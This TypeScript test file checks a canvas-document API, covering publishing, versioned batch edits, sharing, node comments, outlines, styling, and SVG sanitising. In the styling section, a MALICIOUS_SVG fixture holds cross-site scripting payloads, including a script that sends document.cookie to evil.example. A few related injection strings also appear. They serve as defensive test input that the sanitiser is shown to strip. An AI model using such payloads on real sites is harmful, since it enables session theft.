import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  createTestServer,
  jsonBody,
  signIn,
  type PublishedArtifact,
  type SignedInUser,
  type TestServer,
} from './helpers/server.js';
import type { CanvasDocument, CanvasOutline, CommentThread } from '@open-artifact/shared';

let server: TestServer;
let owner: SignedInUser;
let colleague: SignedInUser;

const BOARD = {
  nodes: [
    { id: 'g1', type: 'group', x: 0, y: 0, width: 600, height: 400, label: 'Launch plan' },
    { id: 'n1', type: 'text', x: 20, y: 40, width: 200, height: 80, text: 'Ship the canvas spike' },
    { id: 'n2', type: 'text', x: 300, y: 40, width: 200, height: 80, text: 'Measure React Flow' },
    { id: 'l1', type: 'link', x: 700, y: 0, width: 300, height: 80, url: 'https://jsoncanvas.org' },
  ],
  edges: [{ id: 'e1', fromNode: 'n1', toNode: 'n2' }],
};

beforeEach(async () => {
  server = createTestServer({ SIGNUP_MODE: 'open' });
  owner = await signIn(server, 'owner@example.com');
  colleague = await signIn(server, 'colleague@example.com');
});

afterEach(() => {
  server.close();
});

const publishBoard = (board: unknown = BOARD) =>
  owner.publish({ type: 'canvas', content: JSON.stringify(board) });

const share = (artifact: PublishedArtifact) =>
  owner.as(
    `/api/artifacts/${artifact.id}/sharing/people`,
    jsonBody({ email: 'colleague@example.com' }),
  );

/** What GET /canvas answers: the document, with Kite's own block filled in. */
type CanvasRead = Omit<CanvasDocument, 'kite'> & {
  kite: { docId: string; version: number; formatVersion: number };
};
/** What a batch of operations answers. */
interface OpsResult {
  version: number;
  applied: number;
  ids: Record<string, string>;
}
type OutlineRead = CanvasOutline & { docId: string; version: number };

const ops = (as: SignedInUser, artifact: PublishedArtifact, body: unknown) =>
  as.as(`/api/artifacts/${artifact.id}/canvas/ops`, jsonBody(body));

async function readCanvas(as: SignedInUser, artifact: PublishedArtifact, query = '') {
  const response = await as.as(`/api/artifacts/${artifact.id}/canvas${query}`);
  return { response, body: (await response.json()) as CanvasRead };
}

async function error(response: Response) {
  return ((await response.json()) as { error: { code: string; message: string; details?: unknown } })
    .error;
}

describe('publishing a canvas', () => {
  it('accepts JSON Canvas and names it after its first group', async () => {
    const artifact = await publishBoard();
    expect(artifact.type).toBe('canvas');
    expect(artifact.title).toBe('Launch plan');
    expect(artifact.version).toBe(1);
  });

  it('falls back to the first line of text when there is no group', async () => {
    const artifact = await publishBoard({
      nodes: [{ id: 'a', type: 'text', x: 0, y: 0, width: 10, height: 10, text: 'Ideas\nmore' }],
      edges: [],
    });
    expect(artifact.title).toBe('Ideas');
  });

  it('refuses content that is not a canvas', async () => {
    const response = await owner.as(
      '/api/artifacts',
      jsonBody({ type: 'canvas', content: '# not json', description: 'd', summary: 's' }),
    );
    expect(response.status).toBe(400);
    expect((await error(response)).code).toBe('validation_failed');
  });

  it('refuses file nodes, which would point at files Kite does not have', async () => {
    const response = await owner.as(
      '/api/artifacts',
      jsonBody({
        type: 'canvas',
        content: JSON.stringify({
          nodes: [{ id: 'f', type: 'file', x: 0, y: 0, width: 1, height: 1, file: 'a.png' }],
        }),
        description: 'd',
        summary: 's',
      }),
    );
    expect(response.status).toBe(400);
  });

  it('refuses an edge to a node that does not exist', async () => {
    const response = await owner.as(
      '/api/artifacts',
      jsonBody({
        type: 'canvas',
        content: JSON.stringify({ nodes: [], edges: [{ id: 'e', fromNode: 'x', toNode: 'y' }] }),
        description: 'd',
        summary: 's',
      }),
    );
    expect(response.status).toBe(400);
  });

  it('will not turn a Markdown document into a canvas, or back', async () => {
    const markdown = await owner.publish({ type: 'markdown', content: '# Notes' });
    const response = await owner.as(`/api/artifacts/${markdown.id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'canvas', content: JSON.stringify(BOARD), baseVersion: 1 }),
    });
    expect(response.status).toBe(400);
  });

  it('is served by the content route as JSON, under the sandbox', async () => {
    const artifact = await publishBoard();
    const response = await owner.as(`/a/${artifact.slug}/content`);
    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toMatch(/application\/json/);
    expect(response.headers.get('content-security-policy')).toBeTruthy();
    const body = (await response.json()) as { nodes: unknown[] };
    expect(body.nodes).toHaveLength(4);
  });
});

describe('reading a canvas', () => {
  it('returns JSON Canvas with the version, in the body and a header', async () => {
    const artifact = await publishBoard();
    const { response, body } = await readCanvas(owner, artifact);
    expect(response.status).toBe(200);
    expect(response.headers.get('x-artifact-version')).toBe('1');
    expect(body.kite).toMatchObject({ docId: artifact.id, version: 1, formatVersion: 1 });
    expect(body.nodes.map((n: { id: string }) => n.id)).toEqual(['g1', 'n1', 'n2', 'l1']);
    expect(body.edges).toHaveLength(1);
  });

  it('strips every Kite extra in strict mode', async () => {
    const artifact = await publishBoard();
    await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'add', node: { type: 'text', text: 'new' } }],
    });
    const { body } = await readCanvas(owner, artifact, '?format=jsoncanvas-strict');
    expect(Object.keys(body).sort()).toEqual(['edges', 'nodes']);
    expect(JSON.stringify(body)).not.toContain('"kite"');
  });

  it('is open to people it is shared with, and nobody else', async () => {
    const artifact = await publishBoard();
    expect((await readCanvas(colleague, artifact)).response.status).toBe(404);
    await share(artifact);
    expect((await readCanvas(colleague, artifact)).response.status).toBe(200);
  });

  it('refuses a document that is not a canvas', async () => {
    const markdown = await owner.publish({ type: 'markdown', content: '# Notes' });
    const response = await owner.as(`/api/artifacts/${markdown.id}/canvas`);
    expect(response.status).toBe(400);
  });
});

describe('changing a canvas with operations', () => {
  it('applies a batch as exactly one new version', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [
        { op: 'add', tempId: 't1', in: 'g1', node: { type: 'text', text: 'Write tests' } },
        { op: 'connect', from: 'n2', to: 't1' },
        { op: 'move', id: 'n1', x: 40, y: 60 },
        { op: 'update', id: 'n2', set: { text: 'Measure React Flow at 2k nodes' } },
      ],
    });
    expect(response.status).toBe(200);
    const result = (await response.json()) as OpsResult;
    expect(result.version).toBe(2);
    expect(result.applied).toBe(4);
    expect(result.ids.t1).toMatch(/^n_/);

    const { body } = await readCanvas(owner, artifact);
    const added = body.nodes.find((n: { id: string }) => n.id === result.ids.t1);
    expect(added).toMatchObject({ text: 'Write tests' });
    expect(body.edges).toHaveLength(2);
    expect(body.nodes.find((n: { id: string }) => n.id === 'n1')).toMatchObject({ x: 40, y: 60 });

    const versions = await owner.as(`/api/artifacts/${artifact.id}/versions`);
    expect(((await versions.json()) as { versions: unknown[] }).versions).toHaveLength(2);
  });

  it('refuses a batch based on an old version with 409, and writes nothing', async () => {
    const artifact = await publishBoard();
    await ops(owner, artifact, { baseVersion: 1, ops: [{ op: 'move', id: 'n1', x: 1, y: 1 }] });
    const stale = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'move', id: 'n2', x: 5, y: 5 }],
    });
    expect(stale.status).toBe(409);
    const e = await error(stale);
    expect(e.code).toBe('version_conflict');
    expect(e.details).toMatchObject({ currentVersion: 2, baseVersion: 1 });
    expect((await readCanvas(owner, artifact)).body.kite.version).toBe(2);
  });

  it('refuses the whole batch when one operation is bad, and says which', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [
        { op: 'move', id: 'n1', x: 1, y: 1 },
        { op: 'delete', id: 'nope' },
      ],
    });
    expect(response.status).toBe(400);
    const e = await error(response);
    expect(e.details).toMatchObject({ opIndex: 1 });
    expect(e.message).toMatch(/ops\[1\]/);
    expect((await readCanvas(owner, artifact)).body.kite.version).toBe(1);
  });

  it('checks without writing on a dry run', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      dryRun: true,
      ops: [{ op: 'delete', id: 'n1' }],
    });
    expect(response.status).toBe(200);
    expect(((await response.json()) as { version: number }).version).toBe(1);
    expect((await readCanvas(owner, artifact)).body.nodes).toHaveLength(4);
  });

  it('takes a deleted node’s edges with it', async () => {
    const artifact = await publishBoard();
    await ops(owner, artifact, { baseVersion: 1, ops: [{ op: 'delete', id: 'n2' }] });
    expect((await readCanvas(owner, artifact)).body.edges).toHaveLength(0);
  });

  it('requires baseVersion', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, { ops: [{ op: 'delete', id: 'n1' }] });
    expect(response.status).toBe(400);
  });

  it('is for the owner only: a reader gets 404', async () => {
    const artifact = await publishBoard();
    await share(artifact);
    const response = await ops(colleague, artifact, {
      baseVersion: 1,
      ops: [{ op: 'delete', id: 'n1' }],
    });
    expect(response.status).toBe(404);
  });

  it('needs a signed-in caller', async () => {
    const artifact = await publishBoard();
    const response = await server.request(
      `/api/artifacts/${artifact.id}/canvas/ops`,
      jsonBody({ baseVersion: 1, ops: [] }),
    );
    expect(response.status).toBe(401);
  });

  it('is rate limited on its own budget', async () => {
    const limited = createTestServer({ SIGNUP_MODE: 'open', MAX_CANVAS_OPS_PER_HOUR: '2' });
    try {
      const me = await signIn(limited, 'me@example.com');
      const artifact = await me.publish({ type: 'canvas', content: JSON.stringify(BOARD) });
      const send = (v: number) =>
        me.as(
          `/api/artifacts/${artifact.id}/canvas/ops`,
          jsonBody({ baseVersion: v, ops: [{ op: 'move', id: 'n1', x: v, y: v }] }),
        );
      expect((await send(1)).status).toBe(200);
      expect((await send(2)).status).toBe(200);
      expect((await send(3)).status).toBe(429);
    } finally {
      limited.close();
    }
  });

  it('re-derives the title when the group is renamed', async () => {
    const artifact = await publishBoard();
    await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'update', id: 'g1', set: { label: 'Launch plan v2' } }],
    });
    const response = await owner.as(`/api/artifacts/${artifact.id}`);
    expect(((await response.json()) as { title: string }).title).toBe('Launch plan v2');
  });
});

describe('commenting on a canvas node', () => {
  const comment = (artifact: PublishedArtifact, position?: unknown) =>
    colleague.as(
      `/api/artifacts/${artifact.id}/comments`,
      jsonBody({ body: 'Is this in scope?', position }),
    );
  const threads = async (artifact: PublishedArtifact) => {
    const response = await owner.as(`/api/artifacts/${artifact.id}/comments`);
    return ((await response.json()) as { threads: CommentThread[] }).threads;
  };

  it('anchors to the node and remembers its text', async () => {
    const artifact = await publishBoard();
    await share(artifact);
    const response = await comment(artifact, { nodeId: 'n1' });
    expect(response.status).toBe(201);
    const thread = (await response.json()) as CommentThread;
    expect(thread.anchor).toMatchObject({ kind: 'node', nodeId: 'n1', text: 'Ship the canvas spike' });
  });

  it('refuses a node that is not on the canvas', async () => {
    const artifact = await publishBoard();
    await share(artifact);
    expect((await comment(artifact, { nodeId: 'ghost' })).status).toBe(400);
  });

  it('marks the anchor drifted when the text changes, and lost when the node goes', async () => {
    const artifact = await publishBoard();
    await share(artifact);
    await comment(artifact, { nodeId: 'n1' });

    await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'update', id: 'n1', set: { text: 'Ship it later' } }],
    });
    let [thread] = await threads(artifact);
    expect(thread?.anchorLost).toBe(false);
    expect(thread?.anchorDrifted).toBe(true);

    await ops(owner, artifact, { baseVersion: 2, ops: [{ op: 'delete', id: 'n1' }] });
    [thread] = await threads(artifact);
    expect(thread?.anchorLost).toBe(true);
  });

  it('refuses a node anchor on a Markdown document', async () => {
    const markdown = await owner.publish({ type: 'markdown', content: '# Notes\n\nSome words here.' });
    const response = await owner.as(
      `/api/artifacts/${markdown.id}/comments`,
      jsonBody({ body: 'x', position: { nodeId: 'n1' } }),
    );
    expect(response.status).toBe(400);
  });

  it('has no anchor preview, which is for HTML only', async () => {
    const artifact = await publishBoard();
    const response = await owner.as(
      `/api/artifacts/${artifact.id}/anchor-preview`,
      jsonBody({ nodeId: 'n1' }),
    );
    expect(response.status).toBe(400);
  });
});

describe('the canvas outline', () => {
  it('nests groups and gives one line per node, with the version', async () => {
    const artifact = await publishBoard();
    const response = await owner.as(`/api/artifacts/${artifact.id}/canvas/outline`);
    expect(response.status).toBe(200);
    expect(response.headers.get('x-artifact-version')).toBe('1');
    const body = (await response.json()) as OutlineRead;
    expect(body).toMatchObject({ docId: artifact.id, version: 1, counts: { nodes: 4, edges: 1, groups: 1 } });
    expect(body.tree.map((n) => n.id)).toEqual(['g1', 'l1']);
    expect(body.tree[0]?.children?.map((n) => n.summary)).toEqual(['Ship the canvas spike', 'Measure React Flow']);
    expect(body.freeSlot.x).toBeGreaterThan(1000);
  });

  it('narrows to a frame, and refuses an unknown one or a bad depth', async () => {
    const artifact = await publishBoard();
    const one = (await (await owner.as(`/api/artifacts/${artifact.id}/canvas/outline?frame=g1&depth=1`)).json()) as OutlineRead;
    expect(one.tree).toHaveLength(1);
    expect(one.tree[0]?.summary).toBe('Launch plan (2 inside)');
    expect((await owner.as(`/api/artifacts/${artifact.id}/canvas/outline?frame=n1`)).status).toBe(400);
    expect((await owner.as(`/api/artifacts/${artifact.id}/canvas/outline?depth=0`)).status).toBe(400);
  });

  it('follows read access: a stranger gets 404', async () => {
    const artifact = await publishBoard();
    expect((await colleague.as(`/api/artifacts/${artifact.id}/canvas/outline`)).status).toBe(404);
    await share(artifact);
    expect((await colleague.as(`/api/artifacts/${artifact.id}/canvas/outline`)).status).toBe(200);
  });
});

describe('placing and editing through operations', () => {
  it('places a node beside another with near and side, clear of others', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'add', tempId: 't', near: 'l1', side: 'bottom', node: { text: 'Under the link' } }],
    });
    expect(response.status).toBe(200);
    const id = ((await response.json()) as OpsResult).ids.t;
    const { body } = await readCanvas(owner, artifact);
    const node = body.nodes.find((n) => n.id === id);
    expect(node).toMatchObject({ x: 700, y: 120 });
  });

  it('updates an edge label and sides', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [{ op: 'update', id: 'e1', set: { label: 'then', fromSide: 'bottom', toSide: 'top' } }],
    });
    expect(response.status).toBe(200);
    const { body } = await readCanvas(owner, artifact);
    expect(body.edges[0]).toMatchObject({ label: 'then', fromSide: 'bottom', toSide: 'top' });
  });
});

describe('styles, icons and theme through the API', () => {
  const MALICIOUS_SVG =
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24" onload="alert(1)">' +
    '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' +
    '<foreignObject><img src="x" onerror="alert(2)"/></foreignObject>' +
    '<image xlink:href="https://evil.example/track.png"/>' +
    '<circle cx="12" cy="12" r="10" fill="url(https://evil.example/p)" stroke="#0090ff"/></svg>';

  it('applies styles, icons, edge styles and a theme as one version, and reads them back', async () => {
    const artifact = await publishBoard();
    const response = await ops(owner, artifact, {
      baseVersion: 1,
      ops: [
        { op: 'addAsset', tempId: 'logo', svg: MALICIOUS_SVG, name: 'Logo' },
        { op: 'update', id: 'n1', set: { kite: { style: { fill: '#e6f4ff', borderColor: '5', radius: 12, font: 'inter', fontWeight: 600 }, icon: { name: 'lucide:server', position: 'left' } } } },
        { op: 'update', id: 'n2', set: { kite: { icon: { name: 'asset:logo', position: 'top', size: 48 } } } },
        { op: 'update', id: 'g1', set: { kite: { style: { labelFont: 'grotesk', labelSize: 20 } } } },
        { op: 'update', id: 'e1', set: { color: '#0090ff', toEnd: 'arrow', kite: { style: { width: 2, line: 'dashed', curve: 'step' } } } },
        { op: 'theme', set: { background: '#fafaf7', grid: 'lines', edge: { color: '#71717a' } } },
      ],
    });
    expect(response.status).toBe(200);
    const result = (await response.json()) as OpsResult;
    expect(result.version).toBe(2);

    const { body } = await readCanvas(owner, artifact);
    const assetId = result.ids.logo!;
    const svg = (body.kite as unknown as { assets: Record<string, { svg: string; name: string }> }).assets[assetId]!;
    expect(svg.name).toBe('Logo');
    expect(svg.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#0090ff"/></svg>');
    expect((body.kite as unknown as { theme: unknown }).theme).toEqual({ background: '#fafaf7', grid: 'lines', edge: { color: '#71717a' } });
    expect(body.kite.version).toBe(2);
    const n2 = body.nodes.find((n) => n.id === 'n2')!;
    expect(n2.kite?.icon).toEqual({ name: `asset:${assetId}`, position: 'top', size: 48 });
    expect(body.edges[0]).toMatchObject({ color: '#0090ff', toEnd: 'arrow', kite: { style: { width: 2, line: 'dashed', curve: 'step' } } });

    const strict = await readCanvas(owner, artifact, '?format=jsoncanvas-strict');
    const text = JSON.stringify(strict.body);
    expect(text).not.toContain('kite');
    expect(text).not.toContain('svg');
    expect(Object.keys(strict.body)).toEqual(['nodes', 'edges']);
  });

  it('sanitises an SVG that arrives in a published or replaced document too', async () => {
    const artifact = await publishBoard({
      ...BOARD,
      nodes: BOARD.nodes.map((n) => (n.id === 'n1' ? { ...n, kite: { icon: { name: 'asset:a1' } } } : n)),
      kite: { assets: { a1: { type: 'svg', svg: MALICIOUS_SVG } } },
    });
    const { body } = await readCanvas(owner, artifact);
    const stored = JSON.stringify(body);
    expect(stored).not.toContain('evil.example');
    expect(stored).not.toContain('script');
    expect(stored).not.toContain('onload');
    expect(stored).not.toContain('foreignObject');
  });

  it('refuses an unknown Lucide icon, an unusable SVG, and a bad style, writing nothing', async () => {
    const artifact = await publishBoard();
    const cases: Array<[unknown, RegExp]> = [
      [{ op: 'update', id: 'n1', set: { kite: { icon: { name: 'lucide:not-an-icon-at-all' } } } }, /no Lucide icon "not-an-icon-at-all"/],
      [{ op: 'addAsset', svg: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' }, /Nothing is left to draw/],
      [{ op: 'addAsset', svg: '<!DOCTYPE svg [<!ENTITY x "y">]><svg><text>&x;</text></svg>' }, /defines its own entities/],
      [{ op: 'update', id: 'n1', set: { kite: { style: { fill: 'javascript:alert(1)' } } } }, /fill must be a preset/],
      [{ op: 'update', id: 'e1', set: { kite: { style: { curve: 'spline' } } } }, /curve must be one of/],
      [{ op: 'theme', set: { background: 'url(https://evil.example)' } }, /background must be a preset/],
    ];
    for (const [op, message] of cases) {
      const response = await ops(owner, artifact, { baseVersion: 1, ops: [op] });
      expect(response.status, message.source).toBe(400);
      expect((await error(response)).message).toMatch(message);
    }
    const unknownOnPublish = await owner.as(
      '/api/artifacts',
      jsonBody({ type: 'canvas', content: JSON.stringify({ nodes: [{ ...BOARD.nodes[1], kite: { icon: { name: 'lucide:nope-nope' } } }] }) }),
    );
    expect(unknownOnPublish.status).toBe(400);
    const { body } = await readCanvas(owner, artifact);
    expect(body.kite.version).toBe(1);
  });

  it('refuses an SVG over the size cap', async () => {
    const artifact = await publishBoard();
    const big = `<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/>${'<rect width="1" height="1"/>'.repeat(3000)}</svg>`;
    const response = await ops(owner, artifact, { baseVersion: 1, ops: [{ op: 'addAsset', svg: big }] });
    expect(response.status).toBe(400);
    expect((await error(response)).message).toMatch(/can be up to 64 KB/);
  });
});
